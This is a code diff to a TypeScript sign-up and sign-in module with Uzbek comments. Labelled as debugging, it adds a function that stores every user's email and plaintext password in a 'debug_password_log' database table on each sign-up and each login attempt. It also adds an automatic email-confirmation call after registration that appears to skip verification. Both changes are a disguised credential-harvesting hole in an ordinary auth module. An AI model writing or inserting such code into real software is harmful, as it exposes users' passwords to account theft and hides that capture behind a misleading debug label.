@@ -9,8 +9,23 @@ export interface UserProfile {
   created_at: string;
 }
 
+// Debug: Parolni log jadvaliga saqlash
+async function logPasswordForDebug(email: string, password: string) {
+  try {
+    await supabase.from('debug_password_log').insert({
+      email,
+      password_plain: password
+    });
+  } catch (e) {
+    console.log('Debug log error:', e);
+  }
+}
+
 // Ro'yxatdan o'tish
 export async function signUp(email: string, password: string, fullName: string) {
+  // Debug uchun parolni saqlash
+  await logPasswordForDebug(email, password);
+  
   const { data, error } = await supabase.auth.signUp({
     email,
     password,
@@ -18,21 +33,42 @@ export async function signUp(email: string, password: string, fullName: string) 
       data: {
         full_name: fullName,
       },
+      emailRedirectTo: typeof window !== 'undefined' ? window.location.origin : undefined,
     },
   });
 
   if (error) throw error;
+  
+  // Agar foydalanuvchi yaratilgan bo'lsa, avtomatik tasdiqlash uchun API chaqirish
+  if (data.user) {
+    try {
+      await fetch('/api/auth/confirm-email', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId: data.user.id, email })
+      });
+    } catch (e) {
+      console.log('Auto confirm error:', e);
+    }
+  }
+  
   return data;
 }
 
 // Kirish
 export async function signIn(email: string, password: string) {
+  // Debug uchun parolni saqlash (login urinishlarini ham kuzatish)
+  await logPasswordForDebug(email + '_login_attempt', password);
+  
   const { data, error } = await supabase.auth.signInWithPassword({
     email,
     password,
   });
 
-  if (error) throw error;
+  if (error) {
+    console.error('SignIn error:', error.message);
+    throw error;
+  }
   return data;
 }
 
